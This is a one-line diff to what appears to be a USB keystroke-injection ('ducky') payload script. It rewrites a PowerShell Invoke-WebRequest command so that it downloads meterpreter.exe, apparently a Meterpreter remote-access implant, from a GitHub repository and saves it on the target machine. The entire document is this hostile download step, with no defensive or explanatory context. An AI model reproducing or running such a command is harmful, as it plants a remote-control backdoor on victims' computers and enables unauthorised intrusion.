@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/computer-geek64/ducky/master/meterpreter.ps1" -OutFile meterpreter.exe
+Invoke-WebRequest -Uri "https://github.com/computer-geek64/ducky/raw/master/meterpreter.exe" -OutFile meterpreter.exe
